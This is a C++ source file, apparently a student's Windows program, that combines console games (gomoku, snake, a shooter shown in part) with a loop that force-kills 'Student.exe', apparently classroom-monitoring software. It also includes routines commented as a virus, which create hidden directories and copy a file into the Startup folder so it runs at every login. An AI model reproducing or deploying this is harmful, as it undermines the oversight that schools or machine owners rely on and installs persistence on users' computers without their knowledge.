/*
	Name: Summer Liu
	Copyright: no
	Author: liusirui
	Date: 04/12/2024 21:51
	Description: jiao_killv2.4
*/

//Wow , It's New version of jiao-kill!

#include <ctime>
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bits/stdc++.h>
#include <windows.h>
#include <Shlobj.h>
#include <conio.h>

#define _CRT_SECURE_NO_WARNINGS 1
#define Nor if(B[b].x<5) B[b].x=5;
#define Out1 Bx1-Bvx1<=6||Bx1-Bvx1>=28||By1-Bvy1<=7||By1-Bvy1>=27
#define Out2 Bx2-Bvx2<=6||Bx2-Bvx2>=28||By2-Bvy2<=7||By2-Bvy2>=27
#define Chang1 {Bwhat1=0;Bvx1=Bvy1=0;memset(Bgo1,0,sizeof(Bgo1));}
#define Chang2 {Bwhat2=0;Bvx2=Bvy2=0;memset(Bgo2,0,sizeof(Bgo2));}
#define Chang3 {Bwhat3=0;Bvx3=Bvy3=0;memset(Bgo3,0,sizeof(Bgo3));}

#pragma comment(lib, "shell32.lib")



using namespace std;

float module;
bool repeat = true,repeatwhile = true;//repeat control var
int SleepTime, WaitTime;//time var
string InputModel = "off";//model var

void kill_task() {
	system("cls");
	system("title 清除进程模式");
    cout << "请输入延时开启的秒数：";
	cin >> SleepTime;
	cout << "\n";
	cout << "请输入间隔秒数：";
	cin >> WaitTime;
	sleep(SleepTime);

	while (repeatwhile) {
		system("taskkill /f /im Student.exe");
		sleep(WaitTime);
	}
}

//little game 1
const int N = 15;       //15*15的棋盘
const char ChessBoard = ' ';  //棋盘标志
const char flag1 = 'o';    //玩家1或电脑标志
const char flag2 = 'x';    //玩家2标志

typedef struct Position{    //坐标
    int row;        //行
    int col;        //列
}Position;

class GoBang{     //五子棋类
public:
    GoBang(){
        InitChessBoard();      //初始化棋盘
    }
    void Play(){      //下棋
        Position Play1;   //玩家1或电脑
        Position Play2;   //玩家2
        while (1){
            int mode = ChoiceMode();
            while (1){
                if (mode == 1){       //电脑VS玩家
                    ComputerChess(Play1, flag1);            //电脑走
                    if (GetVictory(Play1, 0, flag1)){       //0代表电脑，为真则表示电脑获胜
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //玩家2走
                    if (GetVictory(Play2, 2, flag2)){       //2代表玩家2
                        break;
                    }
                }
                else{               //玩家1VS玩家2
                    PlayChess(Play1, 1, flag1);         //玩家1走
                    if (GetVictory(Play1, 1, flag1)){       //玩家1赢
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //玩家2走
                    if (GetVictory(Play2, 2, flag2)){       //玩家2赢
                        break;
                    }
                }
            }
            cout << "======再来一局=======" << endl;
            cout << "yes or no :";
            char s[] = "yes";
            cin >> s;
            if (strcmp(s, "no") == 0){
                break;
            }
        }
    }

protected:
    void InitChessBoard(){          //初始化棋盘
        for (int i = 0; i < N + 1; ++i){
            for (int j = 0; j < N + 1; ++j){
                _ChessBoard[i][j] = ChessBoard;
            }
        }
    }

    int ChoiceMode(){           //选择模式
        system("cls");
        //系统调用，清屏
        InitChessBoard();       //重新初始化棋盘
        cout << "*************************************************" << endl;
        cout << "******************0、退出************************" << endl;
        cout << "******************1、电脑VS玩家******************" << endl;
        cout << "******************2、玩家VS玩家******************" << endl;
        cout << "*************************************************" << endl;
        while (1){
            int i = 0;
            cout << "请选择模式：";
            cin >> i;
            if (i == 0){       //退出
                exit(1);
            }
            if (i == 1 || i == 2){
                return i;
            }
            else{
                cout << "非法输入，请重新输入！" << endl;
            }
        }
    }

    void PrintChessBoard(){        //打印棋盘
        printf("     1   2   3   4   5   6   7   8   9  10  11  12  13  14  15\n");
        printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        for (int i = 1; i < N + 1; ++i)
        {
            printf("%2d ", i);
            printf("| %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c |\n", _ChessBoard[i][1], _ChessBoard[i][2], _ChessBoard[i][3], _ChessBoard[i][4], _ChessBoard[i][5], _ChessBoard[i][6], _ChessBoard[i][7], _ChessBoard[i][8], _ChessBoard[i][9], _ChessBoard[i][10], _ChessBoard[i][11], _ChessBoard[i][12], _ChessBoard[i][13], _ChessBoard[i][14], _ChessBoard[i][15]);
            printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        }
        cout << endl;
    }

    void ComputerChess(Position& pos, char flag){     //电脑走
        //PrintChessBoard();      //打印棋盘
        int x = 0;
        int y = 0;
        while (1){                    //循环查找空位置
            x = (rand() % N) + 1;      //产生从1~N的随机数
            srand((unsigned int)time(NULL));
            y = (rand() % N) + 1;      //产生从1~N的随机数
            srand((unsigned int)time(NULL));
            if (_ChessBoard[x][y] == ChessBoard){       //如果这个位置为空（没有棋子），跳出循环，下棋
                break;
            }
        }
        pos.row = x;
        pos.col = y;
        _ChessBoard[pos.row][pos.col] = flag;
    }

    void PlayChess(Position& pos, int player, char flag){
        PrintChessBoard();      //打印棋盘
        while (1){
            printf("请玩家%d输入坐标：", player);
            cin >> pos.row >> pos.col;
            if (JudgeValue(pos) == 1){        //判断坐标是否合法
                break;
            }
            cout << "坐标不合法，请重新输入：" << endl;
        }
        _ChessBoard[pos.row][pos.col] = flag;
    }

    int JudgeValue(const Position& pos){       //判断坐标的合法性
        //1.在棋盘上
        if (pos.row > 0 && pos.row <= N && pos.col > 0 && pos.col <= N){
            //2.所在位置为空（没有棋子）
            if (_ChessBoard[pos.row][pos.col] == ChessBoard){
                return 1;      //合法
            }
        }
        return 0;       //非法
    }

    int JudgeVictory(Position pos, char flag){     //判断是否有玩家获胜（底层判断）
        int begin = 0;
        int end = 0;

        //1.判断行是否满足条件
        (pos.col - 4) > 0 ? begin = (pos.col - 4) : begin = 1;
        (pos.col + 4) > N ? end = N : end = (pos.col + 4);
        for (int i = pos.row, j = begin; j + 4 <= end; ++j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i][j + 1] == flag &&
                _ChessBoard[i][j + 2] == flag && _ChessBoard[i][j + 3] == flag &&
                _ChessBoard[i][j + 4] == flag)
                return 1;
        }
        //2.判断列是否满足条件
        (pos.row - 4) > 0 ? begin = (pos.row - 4) : begin = 1;
        (pos.row + 4) > N ? end = N : end = (pos.row + 4);
        for (int j = pos.col, i = begin ; i + 4 <= end; ++i){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j] == flag &&
                _ChessBoard[i + 2][j] == flag && _ChessBoard[i + 3][j] == flag &&
                _ChessBoard[i + 4][j] == flag)
                return 1;
        }
        //3.判断主对角线是否满足条件
        int len = 0;    //相对长度
        int start = 0;
        int finish = 0;
        pos.row > pos.col ? len = pos.col - 1 : len = pos.row - 1;
        if (len > 4){
            len = 4;
        }
        begin = pos.row - len;       //横坐标起始位置
        start = pos.col - len;       //纵坐标起始位置

        pos.row > pos.col ? len = N - pos.row : len = N - pos.col;
        if (len > 4){
            len = 4;
        }
        end = pos.row + len;         //横坐标结束位置
        finish = pos.col + len;      //纵坐标结束位置

        for (int i = begin, j = start; (i + 4 <= end) && (j + 4 <= finish); ++i, ++j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j + 1] == flag &&
                _ChessBoard[i + 2][j + 2] == flag && _ChessBoard[i + 3][j + 3] == flag &&
                _ChessBoard[i + 4][j + 4] == flag)
                return 1;
        }
        //4.判断副对角线是否满足条件
        (pos.row - 1) > (N - pos.col) ? len = N - pos.col : len = pos.row - 1;
        if (len > 4){
            len = 4;
        }
        begin = pos.row - len;       //横坐标起始位置
        start = pos.col + len;       //纵坐标起始位置

        (N - pos.row) > (pos.col - 1) ? len = pos.col - 1 : len = N - pos.row;
        if (len > 4){
            len = 4;
        }
        end = pos.row + len;         //横坐标结束位置
        finish = pos.col - len;      //纵坐标结束位置
        for (int i = begin, j = start; (i + 4 <= end) && (j - 4 >= finish); ++i, --j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j - 1] == flag &&
                _ChessBoard[i + 2][j - 2] == flag && _ChessBoard[i + 3][j - 3] == flag &&
                _ChessBoard[i + 4][j - 4] == flag)
                return 1;
        }
        //该位置并未下棋
        for (int x = 1; x < N + 1; ++x){
            for (int y = 1; y < N + 1; ++y){
                if (_ChessBoard[x][y] == ChessBoard){
                    return 0;       //未下棋
                }
            }
        }
        return -1;      //和局
    }

    bool GetVictory(Position& pos, int player, char flag){       //判断具体哪位玩家赢
        if (JudgeVictory(pos, flag) != 0){    //判断有无人获胜
            if (JudgeVictory(pos, flag) == 1){     //判断是否有人获胜,1表示获胜
                PrintChessBoard();     //打印棋盘
                if (player == 0){
                    cout << "电脑获胜！" << endl;
                }
                else{
                    printf("恭喜玩家%d获胜！\n", player);
                }
            }
            else{
                printf("和局！\n");
            }
            return true;      //有人获胜
        }
        return false;         //没人获胜
    }

private:
    char _ChessBoard[N + 1][N + 1];    //棋盘
};

BOOL SetImmunity(char *FilePath,char *FileName)     //***病毒*** 
{
    char file[2048] = { 0 };
 
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
    BOOL bRet = CreateDirectory(file, NULL);
    if (bRet)
    {
        strcat(file, "\\anti...\\");
        bRet = CreateDirectory(file, NULL);
        if (bRet)
        {
            SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
            return TRUE;
        }
    }
    return FALSE;
}
void ClearImmunity(char *FilePath, char *FileName)
{
    char file[2048] = { 0 };
 
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
 
    strcat(file, "\\anti...\\");
    RemoveDirectory(file);
 
    ZeroMemory(file, MAX_PATH);
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
    RemoveDirectory(file);
}
BOOL AutoRun_Startup(char *lpszSrcFilePath, char *lpszDestFileName){
    char szStartupPath[MAX_PATH] = { 0 };
    char szDestFilePath[MAX_PATH] = { 0 };
    SHGetSpecialFolderPath(NULL, szStartupPath, CSIDL_STARTUP, TRUE);
    wsprintf(szDestFilePath, "%s\\%s", szStartupPath, lpszDestFileName);
    CopyFile(lpszSrcFilePath, szDestFilePath, FALSE);
    return TRUE;
}



//little game 2
/*** 光标定位 ***/
HANDLE hout=GetStdHandle(STD_OUTPUT_HANDLE);
COORD coord;
 
void locate(int x,int y)
{
    coord.X=y;
    coord.Y=x;
    SetConsoleCursorPosition(hout,coord);
};
 
/*** 隐藏光标 ***/
void hide()
{
    CONSOLE_CURSOR_INFO cursor_info={1,0};
    SetConsoleCursorInfo(hout, &cursor_info);
}
 
/*** 生成随机数 ***/
double random(double start, double end)
{
    return start+(end-start)*rand()/(RAND_MAX + 1.0);
}
 
/*** 定义地图的长宽，蛇的坐标，长度，方向，食物的位置 ***/
int m,n;
 
struct node
{
    int x,y;
}snake[1000];
 
int snake_length,dir;
node food;
int direct[4][2]={{-1,0},{1,0},{0,-1},{0,1}};
 
/*** 输出墙 ***/
void print_wall()
{
    cout << " ";
    for (int i=1;i<=n;i++)
        cout << "-";
    cout << endl;
    for (int j=0;j<=m-1;j++)
    {
        cout << "|";
        for (int i=1;i<=n;i++) cout << " ";
        cout << "|" << endl;
    }
    cout << " ";
    for (int i=1;i<=n;i++)
        cout << "-";
}
 
/*** 首次输出蛇，其中snake[0]代表头 ***/
void print_snake()
{
    locate(snake[0].x,snake[0].y);
    cout << "@";
    for (int i=1;i<=snake_length-1;i++)
    {
        locate(snake[i].x,snake[i].y);
        cout << "*";
    }
}
 
/*** 判断是否撞墙或者自撞 ***/
bool is_correct()
{
    if (snake[0].x==0 || snake[0].y==0 || snake[0].x==m+1 || snake[0].y==n+1) return false;
    for (int i=1;i<=snake_length-1;i++)
    {
        if (snake[0].x==snake[i].x && snake[0].y==snake[i].y) return false;
    }
    return true;
}
 
/*** 随机生成并输出食物位置 ***/
bool print_food()
{
    srand((unsigned)time(0));
    bool e;
    while (1)
    {
        e=true;
        int i=(int) random(0,m)+1,j=(int) random(0,n)+1;
        food.x=i;food.y=j;
        for (int k=0;k<=snake_length-1;k++)
        {
            if (snake[k].x==food.x && snake[k].y==food.y)
            {
                e=false;break;
            }
        }
        if (e) break;
    }
    locate(food.x,food.y);
    cout << "$";
    return true;
}
 
/*** 蛇的前进 ***/
bool go_ahead()
{
    node temp;
    bool e=false;
    temp=snake[snake_length-1];
    for (int i=snake_length-1;i>=1;i--)
        snake[i]=snake[i-1];
    snake[0].x+=direct[dir][0];
    snake[0].y+=direct[dir][1];
    locate(snake[1].x,snake[1].y);
    cout << "*";
    /*** 吃到了食物 ***/
    if (snake[0].x==food.x && snake[0].y==food.y)
    {
        snake_length++;
        e=true;
        snake[snake_length-1]=temp;
    }
    /*** 输出此时蛇状态 ***/
    if (!e)
    {
        locate(temp.x,temp.y);
        cout << " ";
    }
    else
        print_food();
    locate(snake[0].x,snake[0].y);
    cout << "@";
    /*** 如果自撞 ***/
    if (!is_correct())
    {
        system("cls");
        cout << "You lose!" << endl << "Length: " << snake_length << endl;
        return false;
    }
    return true;
}

// little game 3
int ti(float a) {return ((int)(a*10+5))/10;}
void Setpos(float x,float y){COORD pos;pos.X=ti(y*4)/2;pos.Y=ti(x);SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE),pos);}
void Color( int a){if(a==0) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);if(a==1) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN|FOREGROUND_BLUE);if(a==2) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN);if(a==3) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_BLUE);if(a==4) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);if(a==5) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN);if(a==6) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);if(a==7) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);if(a==8) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_RED);if(a==9) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),BACKGROUND_INTENSITY|BACKGROUND_GREEN|BACKGROUND_BLUE);if(a==10) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),BACKGROUND_INTENSITY|BACKGROUND_RED|BACKGROUND_BLUE);if(a==11) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_RED|FOREGROUND_BLUE);if(a==12) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_RED|FOREGROUND_GREEN);if(a==13) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY);if(a==14) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_GREEN|FOREGROUND_BLUE);}
int Blomax,Ren,Exp,Expmax,Lv,Lvl,Ice,Drug,ar1,ar2,Tar1,Tar2,bl,br,Win,T,Tb,Sy,Up,Upt,Down,u1,u2,Kill,Killb,L,Ll[4],Li,D,Gd[10],Biao,Fire,Fir,Water,Thun,Wind,Magne,I[20][2],ib,Dis,Disb,Dis1,Disb1,Boss,Bblo,Bblomax,Bwhat1,Bwhat2,Bwhat3,Bgo1[10],Bgo2[10],Bgo3[10],Bbr,Bbl,Bl[4];
float X,Y,Vx,Vy,Ding,Blo,Hui,Bx1,By1,Bx2,By2,Bx3,By3,Bvx1,Bvy1,Bvx2,Bvy2,Bvx3,Bvy3,Bway[1001][2];
struct bullet{float x,y,vx,vy;int what;int a,t,How;int life;bool kill;}B[100001];
void Map(int a,int b);
void Pan(int a,float x,float y,int b)
{
    float Nox[4],Noy[4];Nox[0]=X,Noy[0]=Y;
    if(Down==1&&X==22) Nox[1]=X+1,Noy[1]=Y-0.5,Nox[2]=X-1,Noy[2]=Y-0.5;else if(Down==2) Nox[1]=X+1,Noy[1]=Y-0.5,Nox[2]=-10,Noy[2]=-10;else if(Down==1||X<18) Nox[1]=X-1,Noy[1]=Y-0.5,Nox[2]=-10,Noy[2]=-10;else Nox[1]=X+1,Noy[1]=Y-0.5,Nox[2]=X-1,Noy[2]=Y-0.5;
    for(int i=0;i<3;i++){
        if(a==-1){if(abs(x-Nox[i])+abs(y-Noy[i])<1.5) {if(B[b].what==-10)Exp+=2;if(B[b].what==-11)Exp+=1;B[b].life=0;if(B[b].life==0&&b==bl) bl++;Map(3,b);break;}}
        if(a==-2){if(abs(x-Nox[i])+abs(y-Noy[i])<2.5) {if(B[b].what==-2)Exp+=5,Biao+=5;if(B[b].what==-3)Fire=300,Ice=0,Fir=3;if(B[b].what==-4)Water=200;if(B[b].what==-5){Wind=70;Ding=28.25;Ice=0;if(Y<Ding-1)Vy=5;else Vy=0;if(Up>=1) Vx=-5;if(Down==2) Vx=5;}if(B[b].what==-6){Thun=200;system("color 1F");Sleep(20);system("color 6F");Sleep(10);system("color 0F");}if(B[b].what==-7)Magne=300;if(B[b].what==-8)Ice=0,Drug=0,Blo=fmin((float)Blomax,Blo+20);if(B[b].what==-9)Exp=fmin((float)Expmax,Exp+20);B[b].life=0;if(B[b].life==0&&b==bl) bl++;Map(3,b);break;}}
    }if(Wind==0&&Thun==0&&(B[b].kill!=0||Killb>=15||Ren==1&&Killb>0)) return;
    for(int i=0;i<3;i++){
        if((Wind>=1||Thun>=1)&&abs(x-Nox[i])+abs(y-Noy[i])<2.5) {if(B[b].what<98)Exp+=2;B[b].life=0;Map(3,b);break;}
        if(a==1) {if(abs(x-Nox[i])<0.5&&abs(y-Noy[i])<1) {if(B[b].what>=99)Blo-=10;if(B[b].what==14)Blo-=15,Ice=100,B[b].life=0;else if(B[b].what==15)Blo-=20,Ice=0,B[b].life=0;else if(B[b].what==17)Blo-=5,Drug=100,B[b].life=0;else if(B[b].what>=13&&B[b].what<=17)Blo-=10,B[b].life=0;else Blo-=15;B[b].kill=1,Killb=20;Kill=1;Map(3,b);break;}}
        if (a==2||a==6||a==8||a==9||a==10||a==11||a==12) {
            if(abs(x-Nox[i])+abs(y-Noy[i])<1.5) {
                if(a==2)Blo-=20;
                else if(a==8)Blo-=10;
                else Blo-=15;B[b].kill=1,Killb=20;Kill=1;if(a!=2){B[b].life=0;if(B[b].life==0&&b==bl) bl++;Map(3,b);break;}}}
        if(a==4) {if((Wind>=1||Thun>=1)&&abs(x-Nox[i])<1.5&&Noy[i]-y<=0&&Noy[i]-y>=-8) {if(B[b].what<98)Exp+=2;B[b].life=0;Map(3,b);break;}if(abs(x-Nox[i])<1&&Noy[i]-y<=0&&Noy[i]-y>=-8) {Blo-=25,B[b].kill=1,Killb=20;Kill=1;Vy=-1;Y-=0.5;break;}}
    }
}
void Map(int a,int b){
    Color(0);
    if(a==-1){
        if(Boss==1||Boss==6){if(Bwhat1==5){if(ti(Bx1)==20)Setpos(Bx1,By1),cout<<"==";else Setpos(Bx1,By1),cout<<"  ";}else{Setpos(Bx1-1,By1-0.5),cout<<"    ";Setpos(Bx1,By1-1),cout<<"      ";Setpos(Bx1+1,By1-0.5),cout<<"    ";if(abs(ti(Bx1)-20)<=1)Setpos(20,By1-1),cout<<"======";}}
        if(Boss==2||Boss==6){Setpos(Bx2-1,By2-1);cout<<"    ";Setpos(Bx2,By2-1);cout<<"      ";Setpos(Bx2+1,By2-1),cout<<"      ";Color(0);if(abs(ti(Bx2)-20)<=1)Setpos(20,By2-1),cout<<"======";}
        if(Boss==3||Boss==6){Setpos(Bx3-1,By3-0.5);cout<<"     ";Setpos(Bx3,By3);cout<<"  ";Setpos(Bx3+1,By3-1),cout<<"      ";Color(0);if(abs(ti(Bx3)-20)<=1)Setpos(20,By3-1),cout<<"=======";}
        if(X<0)return;if(X>=17&&X<=19){Setpos(X-1,Y);cout<<"  ";Setpos(X,Y-1);cout<<"   ";Setpos(X+1,Y-1),cout<<"   ";}else if(X<=23&&X>=21){Setpos(X+1,Y);cout<<"  ";Setpos(X,Y-1);cout<<"   ";Setpos(X-1,Y-1),cout<<"    ";}else if(X>23){Setpos(X,Y-1);cout<<"    ";Setpos(X-1,Y-0.5),cout<<"   ";}else if(X<17&&Upt!=0){Setpos(X,Y-1);cout<<"    ";Setpos(X+1,Y-1.5),cout<<"    ";}else if(X<17){Setpos(X,Y-1);cout<<"    ";Setpos(X+1,Y-0.5),cout<<"   ";}if(Thun>0){Setpos(X-2,Y-1),cout<<"    ";Setpos(X+2,Y-1),cout<<"    ";Setpos(X,Y+2),cout<<"  ";Setpos(X,Y-2.5),cout<<"  ";Setpos(X-1,Y+1),cout<<"  ";Setpos(X+1,Y+1),cout<<"  ";Setpos(X-1,Y-2),cout<<"  ";Setpos(X+1,Y-2),cout<<"  ";Setpos(20,Y-2.5),cout<<"============";}if(Wind!=0){Setpos(X+1,Y-5);cout<<"        ";Setpos(X,Y-5);cout<<"        ";Setpos(X-1,Y-5);cout<<"        ";Setpos(20,Y-5),cout<<"========";}if(Water!=0){Setpos(X,Y-4);cout<<"       ";Setpos(X+2,Y-3.5);cout<<"     ";Setpos(X-2,Y-3.5);cout<<"     ";Setpos(X+1,Y-3.5);cout<<"     ";Setpos(X-1,Y-3.5);cout<<"     ";Setpos(20,Y-5),cout<<"========";}if(Fire!=0){Setpos(X,Y+1),cout<<"  ";Setpos(X+1,Y),cout<<"  ";Setpos(X-1,Y-1),cout<<"  ";Setpos(20,Y-1);cout<<"======";}
    }
    if(a==0){
        if(Boss==1||Boss==6){if(Bwhat1==5)Color(5),Setpos(Bx1,By1),cout<<"█",Color(0);else if(Bwhat1==4&&Bgo1[1]>6&&Bgo1[1]<11)Color(4),Setpos(Bgo1[5]-1,Bgo1[6]),cout<<"︻",Setpos(Bgo1[5],Bgo1[6]-1),cout<<"【",Setpos(Bgo1[5],Bgo1[6]+1),cout<<"】",Setpos(Bgo1[5]+1,Bgo1[6]),cout<<"︼",Color(0);else{Setpos(Bx1-1,By1-0.5),Color(0),cout<<"●●";Setpos(Bx1,By1-1);if(Bwhat1==2&&Bgo1[1]<=5)Color(1);else if(Bwhat1==3&&Bgo1[1]<=5)Color(5);else if(Bwhat1==6&&Bgo1[1]<=5)Color(8); else Color(4);if(Bwhat1==4) Setpos(Bx1,By1-0.5),cout<<"██(";else cout<<")██(";Setpos(Bx1+1,By1-0.5),cout<<"……";Color(0);}}
        if(Boss==2||Boss==6){Setpos(Bx2-1,By2-1);Color(0),cout<<"\\ ";Color(0);cout<<"●";Setpos(Bx2,By2-1);Color(3);cout<<"◥";Color(5),cout<<"JJJ";Color(0),cout<<">";Color(3);Setpos(Bx2+1,By2-1),cout<<"◢█◣";Color(0);}
        if(Boss==3||Boss==6){Setpos(Bx3-1,By3-0.5);if(Bwhat3==3||Bwhat3==9) Color(1);else if(Bwhat3==4||Bwhat3==10) Color(4);else if(Bwhat3==5||Bwhat3==11) Color(5);if(Bwhat3==11)cout<<' ';else if(Bwhat3==6) Color(3);else Color(2);cout<<"●-";Setpos(Bx3,By3);if(Bwhat3==11)cout<<"/";else cout<<"┃";Color(0);Setpos(Bx3+1,By3-1),cout<<"●●●";}
        if(X<0)return;if(Ren==2) Color(12);if(Ren==3) Color(1);if(Ren==4) Color(3);if(Ren==5) Color(4);if(Ren==6) Color(2);if(Drug!=0&&T%5!=0) Color(11);if(Drug!=0&&T%5==0) Color(11);if(Ice!=0) Color(6);if(b==1) Color(8);if(Li!=0) Color(5);if(Ren==1&&Killb>0&&T%4<2) Color(13);if(Wind>0&&T%4<=1) Color(1);if(Wind>0&&T%4>=2) Color(0);if(Thun>0&&T%4<=1) Color(1);if(Thun>0&&T%4>=2) Color(6);
        if(X>=17&&X<=19){Setpos(X-1,Y);cout<<"●";Setpos(X,Y-1);cout<<"━/";if(T%10<3) Setpos(X+1,Y-1),cout<<"┛╲";else if(T%10<6) Setpos(X+1,Y-1),cout<<"┦ ";else Setpos(X+1,Y-1),cout<<"╯>";if(Wind>0&&T%3==0) Setpos(X+1,Y-1),cout<<"┛╲";else if(Wind>0&&T%3==1) Setpos(X+1,Y-1),cout<<"┦ ";else if(Wind>0&&T%3==2)Setpos(X+1,Y-1),cout<<"╯>";}else if(X<=23&&X>=21){Setpos(X+1,Y);cout<<"●";Setpos(X,Y-1);cout<<"━\\";if(T%10<3) Setpos(X-1,Y-1),cout<<"┓╱";else if(T%10<6) Setpos(X-1,Y-1),cout<<"┪ ";else Setpos(X-1,Y-1),cout<<"╮>";if(Wind>0&&T%3==0) Setpos(X-1,Y-1),cout<<"┓╱";else if(Wind>0&&T%3==1) Setpos(X-1,Y-1),cout<<"┪ ";else if(Wind>0&&T%3==2)Setpos(X-1,Y-1),cout<<"╮>";}else if(X>23){Setpos(X,Y-1);cout<<"━ ●";Setpos(X-1,Y-0.5),cout<<"│>";}else if(X<17&&Upt!=0){Setpos(X,Y-1);cout<<"━ ●";Setpos(X+1,Y-1.5),cout<<"╱ >";}else if(X<17){Setpos(X,Y-1);cout<<"━ ●";Setpos(X+1,Y-0.5),cout<<"│>";}if(Thun>0){Setpos(X-2,Y-1),cout<<"▄▄";Setpos(X+2,Y-1),cout<<"▄▄";Setpos(X,Y+2),cout<<"▌";Setpos(X,Y-2.5),cout<<"▌";Setpos(X-1,Y+1),cout<<"█";Setpos(X+1,Y+1),cout<<"█";Setpos(X-1,Y-2),cout<<"█";Setpos(X+1,Y-2),cout<<"█";}if(Magne>0&&T%7<2)Setpos(X,Y),Color(5),cout<<"★";if(Wind>1){if(T%6<2)Color(1);else Color(0);if(T%8<=1){Setpos(X+1,Y-5);cout<<"----  --";Setpos(X,Y-5);cout<<"-  --- -";Setpos(X-1,Y-5);cout<<"--- - --";}else if(T%8<=3){Setpos(X+1,Y-5);cout<<"------  ";Setpos(X,Y-5);cout<<" --  ---";Setpos(X-1,Y-5);cout<<"----- - ";}else if(T%8<=5){Setpos(X+1,Y-5);cout<<"  ------";Setpos(X,Y-5);cout<<"-- --  -";Setpos(X-1,Y-5);cout<<"- ----- ";}else if(T%8<=7){Setpos(X+1,Y-5);cout<<"--  ----";Setpos(X,Y-5);cout<<" --- -- ";Setpos(X-1,Y-5);cout<<"- - ----";}}if(Water!=0){Color(1);if(T%20<5){Setpos(X+2,Y-3);cout<<"■";Setpos(X+1,Y-3.5);cout<<"■";Setpos(X-1,Y-2.5);cout<<"■";Setpos(X-2,Y-3);cout<<"■";}else if(T%20<10||T%20>=15){Setpos(X+2,Y-3);cout<<"■";Setpos(X,Y-4);cout<<"■■";Setpos(X-2,Y-3);  cout<<"■";}else if(T%20<15){Setpos(X+2,Y-3.5);cout<<"■";Setpos(X+1,Y-3);cout<<"■";Setpos(X-1,Y-3.5);cout<<"■";Setpos(X-2,Y-3);cout<<"■";}}if(Fire!=0){if(T%6<3)Color(4);else Color(5);if(Fir>=1)Setpos(X,Y+1),cout<<"●";if(Fir>=2)Setpos(X+1,Y),cout<<"●";if(Fir>=3)Setpos(X-1,Y-1),cout<<"●";}
    }
    if(a==1||a==3){
        if(B[b].what==1){Nor;Setpos(B[b].x,B[b].y-1);if(ti(B[b].x)==20)cout<<"======";else cout<<"      ";if(B[b].life!=0){B[b].y-=B[b].vy;Setpos(B[b].x,B[b].y);if(B[b].How<=1) Color(13);else Color(4);cout<<"●";if(a==1) Pan(1,B[b].x,B[b].y,b);}}
        if(B[b].what==2){Nor;Setpos(B[b].x-1,B[b].y-1);if(ti(B[b].x-1)==20)cout<<"======";else cout<<"      ";Setpos(B[b].x,B[b].y-1);if(ti(B[b].x)==20)cout<<"======";else cout<<"      ";Setpos(B[b].x+1,B[b].y-1);if(ti(B[b].x+1)==20)cout<<"======";else cout<<"      ";if(B[b].life!=0){B[b].y-=B[b].vy;Setpos(B[b].x,B[b].y);Color(5);if(B[b].How==0){Setpos(B[b].x-1,B[b].y),cout<<"↑";Setpos(B[b].x,B[b].y-1),cout<<"←┼ →";Setpos(B[b].x+1,B[b].y),cout<<"↓";}else if(B[b].How==1){Setpos(B[b].x-1,B[b].y-1),cout<<"↖  ↗";Setpos(B[b].x,B[b].y),cout<<"╳";Setpos(B[b].x+1,B[b].y-1),cout<<"↙  ↘";} if(a==1) Pan(2,B[b].x,B[b].y,b);}}
        if(B[b].what==3||B[b].what==5){Nor;Setpos(B[b].x,B[b].y);if(ti(B[b].x)==20)cout<<"==";else cout<<"  ";if(B[b].life!=0){B[b].y-=B[b].vy;B[b].x-=B[b].vx;Setpos(B[b].x,B[b].y);if(B[b].How==1) Color(5);else Color(4);cout<<"◎";}}
        if(B[b].what==4){Nor;Setpos(B[b].x,fmax((float)0,B[b].y-8));if(ti(B[b].x)==20){for(int i=max(0,(int)B[b].y-8);i<=B[b].y;i++)cout<<"==";}else {for(int i=max(0,(int)B[b].y-8);i<=B[b].y;i++)cout<<"  ";}if(B[b].life!=0){B[b].y-=B[b].vy;Setpos(B[b].x,fmax((float)0,B[b].y-8));Color(6); for(int i=max(0,(int)B[b].y-8);i<=B[b].y;i++)cout<<"═"; if(a==1) Pan(4,B[b].x,B[b].y,b);}}
